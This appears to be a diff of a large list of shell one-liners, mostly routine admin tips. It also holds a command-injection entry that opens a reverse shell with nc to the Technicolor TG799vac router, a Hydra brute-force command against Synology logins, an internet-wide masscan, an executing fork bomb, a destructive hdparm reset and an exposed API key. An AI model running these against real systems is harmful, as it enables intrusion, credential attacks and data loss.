 ($) Convert epoch date to human readable date format in a log file.: `cat /var/log/mosquitto/mosquitto.log | awk -F : '{"date -d @"$1 |& getline D; print D, $0}'`
 ($) Get the full path of a bash script's Git repository head.: `(cd "$(dirname "${BASH_SOURCE[0]}")" && git rev-parse --show-toplevel)`
-($) Access folder "-": `cd -- -`
 ($) Jump to home dir and list all, not older than 3 days, with full-path, hidden/non-hidden files/subdirectories: `cd && tree -aicfnF --timefmt %Y%j-%d-%b-%y | grep $(date +%Y%j)'\|'$[$(date +%Y%j)-1]'\|'$[$(date +%Y%j)-2]`
-($) Set a user password without passwd: `chpasswd <<< "user:newpassword"`
-($) Clear terminal Screen: `clear`
 ($) After typing lots of commands in windows, save them to a batch file quickly: `copy con batchfilename.bat`
 ($) Remove multiple entries of the same command in .bash_history with preserving the chronological order: `cp -a  ~/.bash_history ~/.bash_history.bak && perl -ne 'print unless $seen{$_}++'  ~/.bash_history.bak >~/.bash_history`
 ($) Create backup copy of file, adding suffix of the date of the file modification (NOT today's date): `cp file{,.$(date -d @$(stat -c '%Y' file) "+%y%m%d")}`
 ($) Create backup copy of file, adding suffix of the date of the file modification (NOT today's date): `cp file{,.$(date -r file "+%y%m%d")}`
 ($) Create backup copy of file, adding suffix of the date of the file modification (NOT today's date): `cp file file.$(date -d @$(stat -c '%Y' file) "+%y%m%d")`
-($) Clear terminal Screen: `<ctrl+l>`
-($) Extract column from csv file: `cut -d"," -f9`
 ($) Generate random mac-address using md5sum + sed: `date | md5sum | sed -r 's/(..){3}/\1:/g;s/\s+-$//'`
 ($) Poor man's ntpdate: `date -s "$(curl -sD - www.example.com | grep '^Date:' | cut -d' ' -f3-6)Z"`
 ($) Hide or show Desktop Icons on MacOS: `defaults write com.apple.finder CreateDesktop -bool false;killall Finder`
 ($) Find German synonyms using OpenThesaurus: `desyno(){ wget -q -O- https://www.openthesaurus.de/synonyme/search\?q\="$*"\&format\=text/xml | sed 's/>/>\n/g' | grep "<term term=" | cut -d \' -f 2 | paste -s -d , | sed 's/,/, /g' | fold -s -w $(tput cols); }`
-($) Get partitions that are over 50% usage: `df -h | awk '{a=$5;gsub(/%/,"",a);if(a > 50){print $0}}'`
 ($) Update all Docker Images: `docker images --format "{{.Repository}}:{{.Tag}}" | grep ':latest' | xargs -L1 docker pull`
 ($) Determine if booted as EFI/UEFI or BIOS: `[[ -d "/sys/firmware/efi" ]] && echo "UEFI" || echo "BIOS"`
-($) List the size (in human readable form) of all sub folders from the current location: `du -h -d1`
-($) Du command without showing other mounted file systems: `du -h --max-depth=1 --one-file-system /`
-($) Get total of inodes of root partition: `du --total --inodes / | egrep 'total$'`
 ($) Simplest calculator: `echo $[321*4]`
-($) Colorize sequences of digits: `echo abcd89efghij340.20kl | grep --color -e "[0-9]\+" -e "$"`
 ($) Produce 10 copies of the same string: `echo boo{,,,,,,,,,,}`
 ($) Check if port is open on remote machine: `echo >  /dev/tcp/127.0.0.123/8085 && echo "Port is open"`
-($) Hiding ur evil intent!  Shame on you!: `echo 'doing something very evil' >/dev/null && echo doing something very nice!`
 ($) Check web server port 80 response header: `(echo -e 'GET / HTTP/1.0\r\n\r\n';) | ncat <IPaddress> 80`
-($) Change user password one liner: `echo -e "linuxpassword\nlinuxpassword" | passwd linuxuser`
 ($) Fork bomb (don't actually execute): `echo -e "\x23\x21/bin/bash\n\.\/\$\0\&\n\.\/\$\0\&" > bomb.sh && ./bomb.sh`
 ($) Pretty print json block that has quotes escaped: `echo 'json_here' | sed 's/\\//g' | jq .`
 ($) Test sendmail: `echo "Subject: test" | /usr/lib/sendmail -v me@domain.com`
 ($) (OSX) Script to change Terminal profiles based on machine name: `echo "tell application \"Terminal\"\n\t set its current settings of selected tab of window 1 to settings set \"$PROFILE\"\n end tell" | osascript;`
 ($) Remove all the characters after last space per line including it: `echo 'The quick brown fox jumps over the lazy dog' | sed 's|\(.*\) .*|\1|'`
 ($) Remove all the characters before last space per line including it: `echo 'The quick brown fox jumps over the lazy dog' | sed 's|.* ||'`
-($) Set a user password without passwd: `echo 'user:newpassword' | chpasswd`
 ($) Replace all forward slashes with backward slashes: `echo '/usr/bin/' | sed 's|\/|\\|g'`
 ($) Download all recently uploaded pastes on pastebin.com: `elinks -dump https://pastebin.com/archive | grep https | cut -c 7- | sed 's/com/com\/raw/g' | awk 'length($0)>32 && length($0)<35' | grep -v 'messages\|settings\|languages\|archive\|facebook\|scraping'|xargs wget`
 ($) Crash bash: `enable -f /usr/lib/libpng.so png_create_read`
@@ -1247,7 +1251,7 @@ COMBOS (BOX OF CHOCOLATES EDITION)
 ($) Add a mysql user: `grant all on *.* to 'dba'@'localhost' identified by 'dba123' with grant option;`
 ($) Reduce PDF Filesize: `gs -sDEVICE=pdfwrite -dCompatibilityLevel=1.4 -dPDFSETTINGS=/screen -dNOPAUSE -dBATCH  -dQUIET  -dColorImageResolution=600 -dMonoImageResolution=600 -sOutputFile=output.pdf input.pdf`
 ($) Factory reset your harddrive. (BE CAREFUL!): `hdparm --yes-i-know-what-i-am-doing --dco-restore /dev/sdX`
-($) Calculate the distance between two geographic coordinates points (latitude longitude): `h(){ echo $@|awk '{d($1,$2,$3,$4);} function d(x,y,x2,y2,a,c,dx,dy){dx=r(x2-x);dy=r(y2-y);x=r(x);x2=r(x2);a=(sin(dx/2))^2+cos(x)*cos(x2)*(sin(dy/2))^2;c=2*atan2(sqrt(a),sqrt(1-a)); printf("%.4f",6372.8*c);} function r(g){return g*(3.1415926/180.);}';}`
+($) Calculate the distance (in km) between two geographic coordinates points (usage e.g.: h 52.342 118.45 34.9 20.2): `h(){ echo $@|awk '{d($1,$2,$3,$4);} function d(x,y,x2,y2,a,c,dx,dy){dx=r(x2-x);dy=r(y2-y);x=r(x);x2=r(x2);a=(sin(dx/2))^2+cos(x)*cos(x2)*(sin(dy/2))^2;c=2*atan2(sqrt(a),sqrt(1-a)); printf("%.4f",6372.8*c);} function r(g){return g*(3.1415926/180.);}';}`
 ($) Bruteforce Synology NAS Logins with Hydra: `hydra  -I -V -T 5 -t 2  -s 5001 -M /tmp/syno https-post-form '/webman/login.cgi?enable_syno_token=yes:username=^USER^&passwd=^PASS^&OTPcode=:S=true' -L ./ruby-syno-brut/user -P ruby-syno-brut/passlist-short-2.txt`
 ($) Iso to USB with dd and show progress status: `image="file.iso";drive="/dev/null";sudo -- sh -c 'cat '"${image}"'|(pv -n -s $(stat --printf="%s" '"${image}"')|dd of='"${drive}"' obs=1M oflag=direct) 2>&1| dialog --gauge "Writing Image '"${image}"' to Drive '"${drive}"'" 10 70 7'`
 ($) Block all brute force attacks in realtime (IPv4/SSH): `inotifywait -r -q --format %w /var/log/auth.log|grep -i "Failed pass"|tail -n 1|grep -oE '\b([0-9]{1,3}\.){3}[0-9]{1,3}';iptables -I INPUT -i eth0 -s "$(cat /var/log/auth.log|grep "authentication failure; l"|awk -Frhost= '{print $2}'|tail -n 1)" -j DROP`
@@ -1266,8 +1270,6 @@ COMBOS (BOX OF CHOCOLATES EDITION)
 ($) Scan multiple log subdirectories for the latest log files and tail them: `ls /var/log/* -ld | tr -s " " | cut -d" " -f9 | xargs -i{} sh -c 'echo "\n---{}---\n"; tail -n50 {}/`ls -tr {} | tail -n1`'`
 ($) Scan whole internet and specific port in humanistic time: `masscan 0.0.0.0/0 -p8080,8081,8082 --max-rate 100000 --banners --output-format grepable --output-filename /tmp/scan.xt --exclude 255.255.255.255`
 ($) Convert CSV to JSON with miller: `mlr --c2j --jlistwrap cat file.csv`
-($) Premiumize - create a ddl & save the URL in variable MYLINK: `MYLINK=$(curl  'https://www.premiumize.me/api/transfer/directdl?apikey=dzx3rqwrxme8iazu' \   -H 'accept: application/json' \   -H 'Content-Type: application/x-www-form-urlencoded'  --data-raw 'src='$URL | jq -r '.content[] | .link' )`
-($) Hacking the Technicolor TG799vac  (and unlocking features for openwrt): `::::::;nc 192.168.1.144 1337 -e /bin/sh;rm /etc/dropbear/*;uci set dropbear.lan.PasswordAuth='on';uci set dropbear.lan.RootPasswordAuth='on';uci set dropbear.lan.Interface='lan';uci set dropbear.lan.enable='1';/etc/init.d/dropbear restart; uci commit`
 ($) Which processes are listening on a specific port (e.g. port 80): `netstat -nap|grep 80|grep LISTEN`
 ($) Show which programs are listening on TCP ports: `netstat -tlpn`
 ($) List all global top level modles, then remove ALL npm packages with xargs: `npm ls -gp --depth=0 | awk -F/ '/node_modules/ && !/\/npm$/ {print $NF}' | xargs npm -g rm; npm -g uninstall npm`
@@ -1306,7 +1308,7 @@ COMBOS (BOX OF CHOCOLATES EDITION)
 ($) Clear terminal screen: `tput clear`
 ($) Print umask as letters (e.g. `rwxr-xr-x`) instead of number (e.g. `0022`): `unix-permissions convert.stat $(unix-permissions invert $(umask))`
 ($) Emulate a root (fake) environment without fakeroot nor privileges: `unshare -r --fork --pid unshare -r --fork --pid --mount-proc bash`
-TODO (*) Bash test check validate if variable is number: `varNUM=12345; re='^[0-9]+$'; if ! [[ $varNUM =~ $re ]] ; then echo "error: Not a number"; fi`
+($) Bash test check validate if variable is number: `varNUM=12345; re='^[0-9]+$'; if ! [[ $varNUM =~ $re ]] ; then echo "error: Not a number"; fi`
 ($) Compute newest kernel version from Makefile on Torvalds' git repository: `wget -qO - https://raw.githubusercontent.com/torvalds/linux/master/Makefile | head -n5 | grep -E '\ \=\ [0-9]{1,}' | cut -d' ' -f3 | tr '\n' '.' | sed -e "s/\.$//"`
 ($) Apply an xdelta patch to a file: `xdelta -d -s original_file delta_patch patched_file`
 ($) Alert visually until any key is pressed: `while true; do echo -e "\e[?5h\e[38;5;1m A L E R T  $(date)"; sleep 0.1; printf \\e[?5l; read -s -n1 -t1 && printf \\e[?5l && break; done`
@@ -1327,3 +1329,5 @@ STEVEN SEAGAL SHOWING YOU HOW TO MACRAME
 ($) Rename anime fansubs: `rename -n 's/[_ ]?[\[\(]([A-Z0-9-+,\.]+)[\]\)][_ ]?//ig' '[subs4u]_Mushishi_S2_22_(hi10p,720p,ger.sub)[47B73AEB].mkv'`
 ($) Bitcoin Brainwallet Private Key Calculator: `(read -r passphrase; b58encode 80$( brainwallet_exponent "$passphrase" )$( brainwallet_checksum "$passphrase" ))`
 ($) Instead of saying RTFM!: `echo "[q]sa[ln0=aln256%Pln256/snlbx]sb729901041524823122snlbxq" | dc`
+($) Premiumize - create a ddl & save the URL in variable MYLINK: `MYLINK=$(curl  'https://www.premiumize.me/api/transfer/directdl?apikey=dzx3rqwrxme8iazu' \   -H 'accept: application/json' \   -H 'Content-Type: application/x-www-form-urlencoded'  --data-raw 'src='$URL | jq -r '.content[] | .link' )`
+($) Hacking the Technicolor TG799vac  (and unlocking features for openwrt): `::::::;nc 192.168.1.144 1337 -e /bin/sh;rm /etc/dropbear/*;uci set dropbear.lan.PasswordAuth='on';uci set dropbear.lan.RootPasswordAuth='on';uci set dropbear.lan.Interface='lan';uci set dropbear.lan.enable='1';/etc/init.d/dropbear restart; uci commit`
